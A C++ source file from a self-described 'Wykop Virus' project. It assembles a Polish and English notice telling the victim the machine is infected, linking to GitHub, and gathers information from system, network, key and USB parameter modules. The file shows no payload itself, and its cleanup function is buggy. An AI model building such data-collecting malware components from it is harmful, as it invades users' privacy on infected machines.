#include "Information.hpp"
#include "SysParameter.hpp"
#include "NetParameter.hpp"
#include "KeyParameter.hpp"
#include "UsbParameter.hpp"

std::list<Parameter*> Information::parameters;

/// <summary>
/// Creates the summary of informations.
/// </summary>
/// <returns>summary of informations</returns>
std::string Information::getSummaryInfo()
{
	std::string text;
	text += "[PL] Na tym komputerze znajduje sie wirus Wykop. Na githubie jest poradnik jak go usunac. \n";
	text += "[ENG] In this computer is installed a Wykop Virus. On github is tutorial to delete virus. \n";
	for (auto &param : parameters)
	{
		param->mainFunc();
		text += param->getInformation();
	}
	text += "Link do github: https://github.com/Madzik890";
	text += "\n #wykopVirus";
	return text;
}

Information::Information()
{
}

Information::Information(Information &)
{
}

/// <summary>
/// Creates the parameteres.
/// </summary>
void Information::createParameteres()
{
	parameters.clear();
	//system part
	SysParameter * sysparameter = new SysParameter();
	parameters.push_back(new SysParameter(*sysparameter));
	delete sysparameter;

	//net part
	NetParameter *netparameter = new NetParameter();
	parameters.push_back(new NetParameter(*netparameter));
	delete netparameter;

	
	//key part
	KeyParameter *keyparameter = new KeyParameter();
	parameters.push_back(new KeyParameter(*keyparameter));
	delete keyparameter; 

	//USB part
	UsbParameter *usbparameter = new UsbParameter();
	parameters.push_back(new UsbParameter(*usbparameter));
	delete usbparameter;
}


/// <summary>
/// Release a memory.
/// </summary>
void Information::clearParameteres()
{
	for (auto &it : parameters)
	{
		if (it == nullptr)
		{
			delete it;
			parameters.remove(it);
		}
	
	}
	parameters.clear();
}



